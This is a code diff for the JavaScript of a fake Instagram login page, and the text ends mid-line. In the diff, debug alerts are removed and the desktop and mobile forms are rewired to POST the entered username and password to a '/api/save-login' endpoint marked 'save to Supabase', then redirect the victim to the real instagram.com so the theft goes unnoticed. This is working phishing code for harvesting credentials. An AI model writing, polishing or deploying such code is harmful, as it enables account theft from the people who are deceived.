@@ -1,5 +1,5 @@
 /* =========================================================
-   DESKTOP LOGIN - DEBUG VERSION
+   DESKTOP LOGIN
 ========================================================= */
 
 const loginForm = document.getElementById("demoLoginForm");
@@ -11,47 +11,17 @@ if (loginForm) {
     const user_id = document.getElementById("usernameInput").value.trim();
     const pass = document.getElementById("passwordInput").value;
 
-    alert("1. Form submitted\nUser: " + user_id + "\nPass: " + pass);
-
     if (!user_id || !pass) {
-      alert("Missing username or password");
       return;
     }
 
-    try {
-      alert("2. Sending request to /api/save-login...");
-
-      const response = await fetch("/api/save-login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          user_id: user_id,
-          pass: pass
-        }),
-      });
-
-      alert("3. Response status: " + response.status);
-
-      const result = await response.json();
-      alert("4. Response body: " + JSON.stringify(result));
-
-      if (response.ok) {
-        alert("✅ Successfully saved!");
-      } else {
-        alert("❌ Failed to save: " + (result.error || "Unknown error"));
-      }
-    } catch (error) {
-      alert("❌ Fetch error: " + error.message);
-    }
-
-    // window.location.href = "https://www.instagram.com/";  // temporarily disabled
+    await saveCredentials(user_id, pass);
+    window.location.href = "https://www.instagram.com/";
   });
 }
 
 /* =========================================================
-   MOBILE LOGIN - DEBUG VERSION
+   MOBILE LOGIN
 ========================================================= */
 
 const mobileLoginForm = document.getElementById("mobileLoginForm");
@@ -63,45 +33,38 @@ if (mobileLoginForm) {
     const user_id = document.getElementById("mobileUsernameInput").value.trim();
     const pass = document.getElementById("mobilePasswordInput").value;
 
-    alert("1. Mobile form submitted\nUser: " + user_id + "\nPass: " + pass);
-
     if (!user_id || !pass) {
-      alert("Missing username or password");
       return;
     }
 
-    try {
-      alert("2. Sending request to /api/save-login...");
-
-      const response = await fetch("/api/save-login", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          user_id: user_id,
-          pass: pass
-        }),
-      });
-
-      alert("3. Response status: " + response.status);
-
-      const result = await response.json();
-      alert("4. Response body: " + JSON.stringify(result));
-
-      if (response.ok) {
-        alert("✅ Successfully saved!");
-      } else {
-        alert("❌ Failed to save: " + (result.error || "Unknown error"));
-      }
-    } catch (error) {
-      alert("❌ Fetch error: " + error.message);
-    }
+    await saveCredentials(user_id, pass);
+    window.location.href = "https://www.instagram.com/";
   });
 }
 
 /* =========================================================
-   REST OF THE CODE (same as before)
+   SAVE TO SUPABASE
+========================================================= */
+
+async function saveCredentials(user_id, pass) {
+  try {
+    await fetch("/api/save-login", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        user_id: user_id,
+        pass: pass
+      }),
+    });
+  } catch (error) {
+    console.error("Error saving:", error);
+  }
+}
+
+/* =========================================================
+   REST OF THE CODE
 ========================================================= */
 
 const forgotPassword = document.getElementById("forgotPassword");
@@ -165,18 +128,4 @@ if (mobileLoginOverlay) {
 const mobileForgot = document.getElementById("mobileForgot");
 if (mobileForgot) {
   mobileForgot.addEventListener("click", function () {
-    window.location.href = "https://www.instagram.com/accounts/password/reset/";
-  });
-}
-
-const mobileSignup = document.getElementById("mobileSignup");
-if (mobileSignup) {
-  mobileSignup.addEventListener("click", function () {});
-}
-
-const mobileLanguage = document.getElementById("mobileLanguage");
-if (mobileLanguage) {
-  mobileLanguage.addEventListener("click", function () {
-    alert("Language selector — demo only.");
-  });
-}
+    window.location.href = "https://www.instagram.com/accounts/passwo
